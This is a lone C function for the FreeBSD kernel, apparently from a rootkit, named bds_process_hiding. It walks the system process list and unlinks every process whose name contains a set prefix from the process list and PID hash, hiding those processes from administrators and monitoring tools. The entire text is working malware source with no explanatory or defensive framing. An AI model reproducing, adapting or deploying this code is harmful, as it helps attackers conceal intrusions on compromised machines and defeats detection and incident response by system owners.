static int bds_process_hiding(struct thread *td, void *syscall_args) {
	struct proc *p;
	sx_xlock(&allproc_lock);

	FOREACH_PROC_IN_SYSTEM(p) {
		PROC_LOCK(p);

		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
			PROC_UNLOCK(p);
			continue;
		}

		if (strstr(p->p_comm, BDS_PREFIX)) {
			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);
		}

		PROC_UNLOCK(p);
	}

	sx_xunlock(&allproc_lock);

	return 0;
}
